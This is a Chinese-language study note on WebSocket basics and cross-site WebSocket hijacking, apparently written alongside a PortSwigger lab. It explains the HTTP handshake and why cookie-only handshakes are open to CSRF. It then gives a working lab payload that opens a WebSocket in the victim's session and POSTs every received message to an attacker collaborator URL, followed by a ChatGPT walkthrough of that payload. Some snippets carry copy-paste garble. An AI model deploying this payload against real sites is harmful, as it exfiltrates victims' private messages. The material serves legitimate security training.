WebSocket广泛用于现代Web应用程序。它们通过HTTP启动，并通过双向异步通信提供长期连接。

WebSocket可以用于实现各种功能，包括执行用户操作和传输敏感信息。WebSocket在需要低延迟或服务启动消息的情况下特别有用。

websocket连接通常使用客户端JS创建，如下所示

```js
var ws = new WebSocket("wss://normal-website.com/chat");
```

为了建立连接，浏览器和服务器**通过HTTP执行**WebSocket握手。浏览器发出WebSocket握手请求，如下所示：

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

如果服务器接受连接，它将返回websocket握手响应，如下所示：

```solidity
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

此时，网络连接保持打开状态，可用于向任一方发送websocket消息。

>WebSocket握手消息的几个特性：
>
>- 请求和响应中的`connection`和`upgrade`头表示这是websocket握手。
>- `sec-websocket-version` 请求头指定客户端希望使用的websocket协议版本。通常是13
>- `Sec-WebSocket-Accept` 头包含一个Base64编码的随机值，该值在每次握手请求时随机生成。
>- `Sec-WebSocket-Accept` 响应头包含在 `Sec-WebSocket-Key` 请求头中提交的值的哈希值，并与协议规范中定义的特定字符串连接。这样做是为了防止因服务器或缓存代理配置错误而产生的误导性响应。

建立websocket连接后，客户端或服务器可以在任一方向异步发送消息。

可以使用客户端js从浏览器发送一条简单的消息，如下所示：

```solidity
ws.send("Peter Wiener");
```

原则上，websocket消息可以包含任何内容或数据格式。在现代应用程序中，json通常用于在websocket消息中发送结构化数据。

例如，使用websocket的聊天机器人应用程序可能会发送以下消息：

```solidity
{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}
```

跨站websocket劫持

跨站websocket劫持涉及websocket握手时的csrf漏洞。当websocket握手请求仅依赖于HTTP cookie进行会话处理并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。

攻击者可以在自己的域上创建恶意网页，从而与脆弱网站建立跨站websocket连接。应用程序将受害用户与应用程序会话的上下文中处理连接。

然后，攻击者的页面可以**通过连接向服务器发送任意消息**，**并读取从服务器接受回的消息内容**。这意味着，与常规CSRF不同，攻击者可以与受感染的网站双向交互。

和找普通的CSRF攻击一样，跨站websocket劫持也需要找到一个仅依赖于HTTP cookie进行会话处理的握手消息，并且不会在请求参数中使用任何token或其他不可预测的值。

例如，以下websocket握手请求可能容易受到CSRF的攻击，因此唯一的会话token是在cookie中传输的。

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

> `Sec-WebSocket-Key` 包含一个随机值，以防止缓存代理时出现错误，**并且不用于身份验证或会话处理目的。**

如果websocket握手请求容易受到CSRF的攻击，则攻击者的网页可以执行跨站点请求，在易受攻击的站点上打开websocket。攻击中接下来会发生什么完全取决于应用程序。

>[Lab: Cross-site WebSocket hijacking ](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
>
>**payload**
>
>```solidity
><script>
>    var ws = new WebSocket('wss://your-websocket-url');
>    ws.onopen = function() {
>        ws.send("READY");
>    };
>    ws.onmessage = function(event) {
>        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
>    };
></script>
>```
>
>**chatgpt**
>
>这个JavaScript脚本创建了一个WebSocket连接（`ws`），并定义了一些事件处理程序。以下是脚本的主要功能：
>
>1. WebSocket连接：
>
>   ```js
>   var ws = new WebSocket('wss://0aa2006104af81dc85a2a981000c002d.web-security-academy.net/chat');
>   ```
>
>   通过创建一个WebSocket对象，该对象连接到了指定的WebSocket地址 `'wss://0aa2006104af81dc85a2a981000c002d.web-security-academy.net/chat'`。这可能是与聊天服务器或实时通信相关的WebSocket地址。
>
>2. WebSocket打开时发送消息：
>
>   ```js
>   codews.onopen = function() {
>       ws.send("READY");
>   };
>   ```
>
>   当WebSocket连接成功打开时，通过 `ws.send("READY")` 发送了一条消息，消息内容是字符串 "READY"。
>
>3. WebSocket接收消息时进行处理：
>
>   ```js
>   javascriptCopy codews.onmessage = function(event) {
>       fetch('https://255nqfuua69rvyaxjt79wwei99fz3o.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
>   };
>   ```
>
>   当WebSocket接收到消息时，使用 `ws.onmessage` 事件处理程序。在这里，它通过 `fetch` API 向指定的URL `'https://255nqfuua69rvyaxjt79wwei99fz3o.burpcollaborator.net'` 发送了一条POST请求，请求体（`body`）是通过WebSocket接收到的消息（`event.data`）。